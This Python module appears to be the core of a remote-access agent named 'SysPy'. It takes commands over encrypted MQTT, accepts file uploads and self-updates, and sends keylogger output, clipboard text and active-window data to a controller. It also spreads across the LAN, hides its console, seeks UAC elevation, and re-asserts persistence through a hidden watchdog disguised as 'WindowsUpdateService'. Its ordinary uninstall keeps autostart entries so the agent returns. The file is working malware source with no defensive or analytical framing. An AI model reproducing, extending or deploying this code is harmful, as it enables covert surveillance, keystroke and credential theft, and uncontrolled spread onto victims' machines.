"""Agent lifecycle and transport loop."""

from __future__ import annotations

import hashlib
import os
import random
import socket
import subprocess
import sys
import threading
import time
import traceback
from typing import Any

from .. import __version__, config, crypto, log, protocol, guardian
from ..mqtt import MqttClient, random_client_id
from ..lan.beacon import LanService
from ..lan.spread import Spreader
from . import (commands, health, persistence, runtime, session, stealth,
               sysinfo, updater)
from .inputs import Keylogger
from . import machine_state

#: Concurrent command ceiling. A broadcast otherwise spawns one thread per
#: message with no limit.
_COMMAND_SLOTS = threading.BoundedSemaphore(config.MAX_CONCURRENT_COMMANDS)


class Agent:
    """The running agent.

    Owns the transport, the command dispatcher and the background workers.
    """

    def __init__(self) -> None:
        self.agent_id = config.agent_id()
        master_key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT,
                                       config.KDF_ITERATIONS)
        self.key = crypto.subkey(master_key, self.agent_id)
        self.codec = protocol.Codec(self.key, fmt=config.ENVELOPE_FMT)
        # A pre-patch controller still speaks the legacy envelope. Decoding
        # auto-detects, but we keep a dedicated codec for a clear audit trail.
        self.legacy_codec = protocol.Codec(self.key, fmt=1)
        self.reassembler = protocol.Reassembler()
        self.health = health.Health()

        self.hostname = socket.gethostname()
        self.cwd = os.path.expanduser("~")
        self.processes: set[Any] = set()
        self.keylogger = Keylogger()

        self.lan: LanService | None = None
        self.spreader = Spreader()

        self.bundle_entry = os.path.join(stealth.bundle_root(), os.path.basename(sys.argv[0]))
        self.self_sha = self._sha_of(self.bundle_entry)

        self._peer_ids: set[str] = set()
        self.eval_namespace: dict[str, Any] = {
            "agent": self, "os": os, "sys": sys, "time": time,
            "config": config, "sysinfo": sysinfo,
        }

        self._log = log.get("core")
        self._update_lock = threading.Lock()
        self._client: MqttClient | None = None
        self._connected = threading.Event()
        self._last_persistence_check = 0.0
        self._running = True

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _sha_of(path: str) -> str:
        try:
            with open(path, "rb") as handle:
                return hashlib.sha256(handle.read()).hexdigest()[:12]
        except OSError:
            return "unknown"

    def _mac(self) -> str:
        return config.mac()

    def _subnet(self) -> str:
        return config.subnet()

    def _known_peer_ids(self) -> set[str]:
        return set(self._peer_ids) | {a for a in (config.parent_id(),) if a}

    def _on_peer(self, record: dict) -> None:
        self.send({"t": "note", "d": f"peer {record.get('host')} {record.get('ip')} hop={record.get('hop')}"})

    def reply(self, text: str) -> None:
        """Send a line of output to the controller."""
        self.send({"t": "out", "d": text})

    def send_json(self, payload: dict[str, Any]) -> None:
        """Send structured data (file listings, process tables, ...)."""
        self.send({"t": "json", **payload})

    def send_file(self, name: str, data: bytes) -> None:
        """Send a binary payload in chunks."""
        transfer = os.urandom(4).hex()
        for part in protocol.chunk(data, transfer):
            self.send({"t": "file", "name": name, **part})
            time.sleep(0.01)

    def send(self, message: dict[str, Any]) -> None:
        """Seal and publish a message."""
        if not self._client or not self._client.alive:
            return
        try:
            self._client.publish(
                config.topic_up(self.agent_id),
                self.codec.encode(message),
                qos=0 if message.get("t") == "evt" else 1,
            )
        except Exception as error:
            self._log.debug("publish failed: %s", error)

    def hello_payload(self) -> dict[str, Any]:
        """The identity document sent on connect and on every heartbeat."""
        return {
            "t": "hello",
            "id": self.agent_id,
            "name": self.hostname,
            "ver": __version__,
            "build": getattr(__import__("syspy"), "BUILD_ID", __version__),
            "proto": config.PROTOCOL_VERSION,
            "fmt": config.ENVELOPE_FMT,
            "session": session.current_session(),
            "headless": session.is_headless(),
            "sha": self.self_sha,
            "kit_sha": str(config._deploy().get("kit_sha") or ""),
            "path": self.bundle_entry,
            "pid": os.getpid(),
            "info": sysinfo.summary(),
            "admin": stealth.is_admin(),
            "persistence": persistence.status(),
            "parent": config.parent_id(),
            "hop": config.hop(),
            "parent_ip": config.parent_ip(),
            "mac": self._mac(),
            "subnet": self._subnet(),
            "group": config.group(),
            "lan": bool(self.lan),
            "health": self.health.summary(),
        }

    # ------------------------------------------------------------------
    # Inbound
    # ------------------------------------------------------------------

    def _on_message(self, topic: str, payload: bytes) -> None:
        message = None
        for codec in (self.codec, self.legacy_codec):
            message, reason = codec.decode_message(payload)
            if reason != protocol.REASON_BAD:
                break
        if message is None:
            return

        kind = message.get("t")
        if kind == "cmd":
            line = message.get("d", "")

            def _run() -> None:
                with _COMMAND_SLOTS:
                    commands.execute(self, line)

            threading.Thread(target=_run, name="cmd", daemon=True).start()
        elif kind == "roster":
            self._peer_ids = {str(x) for x in (message.get("ids") or []) if x}
        elif kind == "put":
            self._receive_upload(message)
        elif kind == "update":
            self._receive_update(message)

    def _receive_upload(self, message: dict[str, Any]) -> None:
        from . import files
        data = self.reassembler.feed(message, time.time())
        if data is None:
            received, total = self.reassembler.progress(message)
            if total > 3 and received % 5 == 0:
                self.send({"t": "progress", "d": f"upload {received}/{total}"})
            return
        try:
            destination = files.save_upload(message.get("dest", "."),
                                            message.get("name", "file.bin"), data)
            self.reply(f"saved {len(data)} bytes -> {destination}")
            self.send_json({"kind": "fs_op_result", "op": "upload", "success": True, "path": destination})
        except Exception as err:
            self.reply(f"upload failed: {err}")
            self.send_json({"kind": "fs_op_result", "op": "upload", "success": False, "error": str(err)})

    def _receive_update(self, message: dict[str, Any]) -> None:
        if int(message.get("proto", 0)) > 2:
            self.reply("update rejected: controller protocol newer than agent")
            return
        data = self.reassembler.feed(message, time.time())
        if data is None:
            received, total = self.reassembler.progress(message)
            if total > 3 and received % 5 == 0:
                self.send({"t": "progress", "d": f"update {received}/{total}"})
            return
        if not self._update_lock.acquire(blocking=False):
            self.reply("update already in progress")
            return
        try:
            self.reply("update: verifying")
            ok, detail = updater.apply(data, message.get("sha", ""), message.get("sig", ""))
            self.reply(f"update {detail}" if ok else f"update failed: {detail}")
        except Exception as error:
            self.reply(f"update failed: {error}")
        finally:
            try:
                self._update_lock.release()
            except RuntimeError:
                pass

    # ------------------------------------------------------------------
    # Periodic workers
    # ------------------------------------------------------------------

    def _heartbeat(self) -> None:
        while self._running:
            time.sleep(config.HEARTBEAT_INTERVAL)
            try:
                self.send(self.hello_payload())
            except Exception:
                pass

    def _telemetry(self) -> None:
        last_clipboard = ""
        while self._running:
            time.sleep(config.TELEMETRY_INTERVAL)
            try:
                current = sysinfo.clipboard_text()
                clipboard = None
                if current != last_clipboard:
                    last_clipboard = current
                    clipboard = current[:120]

                self.send({
                    "t": "evt",
                    "k": "stat",
                    "cpu": sysinfo.cpu_percent(),
                    "ram": sysinfo.memory_percent(),
                    "battery": sysinfo.battery(),
                    "idle": sysinfo.idle_seconds(),
                    "window": sysinfo.active_window(),
                    "processes": sysinfo.process_count(),
                    "uptime": sysinfo.uptime(),
                    "clipboard": clipboard,
                })
                if hasattr(self, "keylogger") and self.keylogger.running:
                    fresh = self.keylogger.drain()
                    if fresh:
                        self.send({"t": "keys", "d": fresh[-4000:]})
            except Exception:
                pass

    def _housekeeping(self) -> None:
        """Re-assert persistence and heal missing copies."""
        while self._running:
            time.sleep(15)
            try:
                now = time.time()
                if now - self._last_persistence_check > 30:
                    self._last_persistence_check = now
                    if session.should_yield() and session.yield_to_interactive(5.0):
                        self._log.info("handing over to the interactive session")
                        self.shutdown(0)
                    actions = persistence.ensure() + guardian.ensure()
                    if actions:
                        self._log.info("persistence: %s", ", ".join(actions))
                        self.send({"t": "note", "d": "persistence: " + ", ".join(actions)})
            except Exception as error:
                self._log.warning("housekeeping failed: %s", error, exc_info=True)

    def _spawn_watchdog(self) -> None:
        """Start the supervisor twin if one is not already running."""
        if os.environ.get("SYSPY_NO_WATCHDOG"):
            return

        lock = stealth.watchdog_lock_path()
        owner = stealth.read_pid(lock)
        if owner and owner != os.getpid() and stealth.process_alive(owner):
            return

        command = [sys.executable, self.bundle_entry, "--watchdog", "--no-elevate"]
        if os.name == "nt":
            python = runtime.interpreter()
            if python.lower().endswith("python.exe"):
                windowless = python[: -len("python.exe")] + "pythonw.exe"
                if os.path.exists(windowless):
                    python = windowless
            command = [python, self.bundle_entry, "--watchdog"]

        try:
            subprocess.Popen(
                command, close_fds=True,
                creationflags=(0x00000008 | 0x00000200) if os.name == "nt" else 0)
        except OSError as error:
            self._log.warning("watchdog spawn failed: %s", error)

    # ------------------------------------------------------------------
    # Transport
    # ------------------------------------------------------------------

    def _connect(self) -> bool:
        for host, port, use_tls in config.broker_order():
            try:
                client = MqttClient("syspy-a-" + config.short_id(), self._on_message)
                client.connect(
                    host, port, use_tls,
                    clean_session=False,
                    will_topic=config.topic_up(self.agent_id),
                    will_payload=self.codec.encode({"t": "bye"}),
                )
                self._client = client
                if not client.subscribe(config.topic_down(self.agent_id), qos=1):
                    self.send({"t": "note", "d": "broker did not SUBACK the downlink topic"})
                self._connected.set()
                self.send({"t": "note", "d": f"connected via {host}:{port}"})
                self.send(self.hello_payload())
                return True
            except Exception as err:
                self._log.warning("connect to %s:%s (tls=%s) failed: %s", host, port, use_tls, err)
                continue
        return False

    def run(self) -> None:
        """Main loop.  Never returns unless the process is killed."""
        updater.write_boot_marker()

        if config.LAN_ENABLED:
            try:
                self.lan = LanService(on_peer=self._on_peer, spreader=self.spreader)
                self.lan.start()
                self.spreader.attach(self.lan, known_ids_getter=self._known_peer_ids)
            except Exception:
                self.lan = None

        for worker in (self._heartbeat, self._telemetry, self._housekeeping):
            threading.Thread(target=worker, name=worker.__name__, daemon=True).start()
        self._spawn_watchdog()

        def greet() -> None:
            while self._running:
                time.sleep(2)
                if self._connected.is_set():
                    self.send(self.hello_payload())
                    return
        threading.Thread(target=greet, name="greet", daemon=True).start()

        import random
        reconnect_attempts = 0
        while self._running:
            if not self._connect():
                reconnect_attempts += 1
                delay = min(60.0, config.MQTT_RECONNECT_DELAY * (1.5 ** min(reconnect_attempts, 6)))
                jitter = random.uniform(0.8, 1.2)
                time.sleep(delay * jitter)
                continue
            reconnect_attempts = 0
            client = self._client
            while client and client.alive:
                time.sleep(1)
            self._connected.clear()
            if client:
                try:
                    client.disconnect()
                except Exception:
                    pass
            time.sleep(config.MQTT_RECONNECT_DELAY + random.uniform(0.5, 2.0))

    def stop(self) -> None:
        self._running = False

    def shutdown(self, code: int = 0) -> None:
        """Disconnect cleanly, drop the lock, then exit.

        A bare ``os._exit`` from a worker thread skipped ``finally`` blocks and
        left stale locks behind. The MQTT will already covers the offline blip
        on an update, so a real DISCONNECT is the correct goodbye everywhere
        else.
        """
        self._running = False
        try:
            if self._client is not None:
                self._client.publish(
                    config.topic_up(self.agent_id),
                    self.codec.encode({"t": "bye"}), qos=0)
                time.sleep(0.15)
                self._client.disconnect()
        except Exception:
            pass
        try:
            stealth.release_single_instance()
        except Exception:
            pass
        os._exit(code)


def main(argv: list[str] | None = None) -> int:
    """Entry point for ``agent.py``."""
    argv = list(sys.argv[1:] if argv is None else argv)

    # Process --no-uac early before uninstall and auto-elevate
    if "--no-uac" in argv:
        os.environ["SYSPY_NO_UAC"] = "1"

    if "--watchdog" in argv:
        return _watchdog_main()

    takeover = 0
    if "--takeover" in argv:
        try:
            takeover = int(argv[argv.index("--takeover") + 1])
        except (ValueError, IndexError):
            takeover = 0

    entry = os.path.join(stealth.bundle_root(), os.path.basename(sys.argv[0]))

    if "--check" in argv:
        print(f"version : {__version__}")
        print(f"entry   : {entry}")
        print(f"root    : {stealth.bundle_root()}")
        print(f"admin   : {stealth.is_admin()}")
        for directory in stealth.install_directories():
            candidate = os.path.join(directory, stealth.executable_name())
            print(f"{'OK  ' if os.path.exists(candidate) else 'MISS'} {candidate}")
        return 0

    if "--uninstall" in argv or "--remove" in argv or "--purge" in argv:
        hard = ("--purge" in argv) or ("--force" in argv)

        # Elevation happens HERE, in the same block, so --purge gets it too.
        # purge() needs admin for guardian.remove() and the HKLM Run value.
        # Putting this after the block silently degrades --purge to user-level.
        if (stealth.IS_WINDOWS and not stealth.is_admin()
                and os.environ.get("SYSPY_NO_UAC") != "1"
                and "--no-elevate" not in argv):
            print("[*] Requesting Administrator privileges for complete removal...")
            if stealth.elevate_process(argv, wait=True):
                print("[+] Uninstallation complete.")
                return 0
            print("[!] Elevation declined or unavailable - continuing with user-level removal.")

        print("Removing SysPy agent...")
        actions = persistence.purge() if hard else persistence.remove(keep_anchor=True)
        for action in actions:
            print(f"  [x] {action}")
        if not hard:
            print("  [i] autostart vectors kept - the agent returns within ~5 minutes.")
            print("      agent.py --uninstall --force   removes it completely.")
        print("Done.")
        return 0

    if "--stop" in argv:
        print("Stopping SysPy agent (autostart vectors kept)...")
        for action in persistence.stop():
            print(f"  [x] {action}")
        print("Done. The agent returns at the next logon.")
        return 0

    if "--install" in argv:
        print("\n".join(persistence.install()))
        return 0

    # ------------------------------------------------------------------
    # Order matters. Everything below happens before a single UAC decision.
    #
    # 1. An agent already alive? Leave, without touching UAC. This is the
    #    check that used to be missing: the global mutex is visible across
    #    sessions and elevation boundaries, so a sibling launcher notices an
    #    elevated agent it could never have seen through the pid file.
    # 2. A headless (session 0) agent with a user logged on? Hand the lock to
    #    the interactive ONLOGON task and leave, so the desktop works.
    # 3. Only then consider elevating, at most once per boot.
    # ------------------------------------------------------------------
    if not takeover and stealth.agent_already_running():
        log.get("core.boot").info("agent already running, standing down")
        return 0

    if not takeover and session.should_yield():
        if session.yield_to_interactive():
            log.get("core.boot").info("handed over to the interactive session")
            return 0

    # A session-0 agent is already SYSTEM, so it never needs to elevate.
    want_elevate = (
        stealth.IS_WINDOWS
        and not stealth.is_admin()
        and not session.is_headless()
        and os.environ.get("SYSPY_NO_UAC") != "1"
        and "--no-elevate" not in argv
    )
    if want_elevate:
        if stealth.claim_boot():
            log.get("core.boot").info("boot claim won, requesting elevation")
            if stealth.elevate_process(list(argv) + ["--takeover", str(os.getpid())]):
                return 0
            log.get("core.boot").warning("elevation declined, running unelevated")
        else:
            # Wait for the winner rather than racing it. A UAC prompt can take
            # a while; if it never resolves we degrade to unelevated, which is
            # still fully functional, just without HKLM/SYSTEM/ACL vectors.
            log.get("core.boot").info("boot claim lost, waiting for the elevated instance")
            deadline = time.time() + config.BOOT_WAIT
            while time.time() < deadline:
                if stealth.agent_already_running():
                    return 0
                time.sleep(0.4)

    if stealth.acquire_single_instance(takeover, prefer_interactive=True):
        return 0

    stealth.set_console_title(f"{config.PRODUCT_DESCRIPTION} ({config.PRODUCT_NAME})")
    stealth.disable_quick_edit()
    if "--visible" not in argv and "--debug" not in argv:
        stealth.hide_console()

    log.setup(os.path.join(stealth.primary_directory(), "logs"), tag="agent")
    log.get("core").info("agent starting pid=%s admin=%s", os.getpid(), stealth.is_admin())
    runtime.ensure()
    for action in persistence.install():
        log.get("core.persistence").info("install: %s", action)
    persistence.install_copies()

    agent = Agent()
    try:
        agent.run()
    except KeyboardInterrupt:
        pass
    except Exception:
        traceback.print_exc()
        time.sleep(5)
    finally:
        stealth.release_single_instance()
    return 0


def _watchdog_main() -> int:
    """Tiny supervisor: restart the agent if it dies.

    The watchdog owns its *own* lock file holding its *own* pid, so a restarted
    agent can tell a live supervisor from a stale one.
    """
    lock = stealth.watchdog_lock_path()
    owner = stealth.read_pid(lock)
    if owner and owner != os.getpid() and stealth.process_alive(owner):
        return 0

    stealth.write_pid(lock, os.getpid())
    stealth.set_console_title("WindowsUpdateService (watchdog)")
    stealth.hide_console()
    yielded = False

    entry = os.path.join(stealth.bundle_root(), os.path.basename(sys.argv[0]))

    last_assert = 0.0
    while True:
        time.sleep(5)
        stealth.write_pid(lock, os.getpid())

        if time.time() - last_assert > 60:
            last_assert = time.time()
            try:
                persistence.ensure()
                guardian.ensure()
            except Exception:
                pass

        owner = stealth.read_pid(stealth.lock_path())
        if owner and stealth.process_alive(owner):
            yielded = False
            continue

        # Nothing is running. If we are headless and a user is logged on, the
        # interactive task is the better place to be, so ask it first and only
        # spawn a session-0 copy if it never turns up.
        if session.should_yield():
            if session.run_task(config.TASK_NAME):
                time.sleep(8)
                owner = stealth.read_pid(stealth.lock_path())
                if owner and stealth.process_alive(owner):
                    yielded = True
                    continue
            if yielded:
                time.sleep(10)
                continue

        try:
            command = [entry] if entry.lower().endswith(".exe") else [runtime.interpreter(), entry]
            subprocess.Popen(command + ["--hidden", "--no-elevate"], close_fds=True,
                             creationflags=0x00000200 if os.name == "nt" else 0)
        except OSError:
            pass
        time.sleep(10)
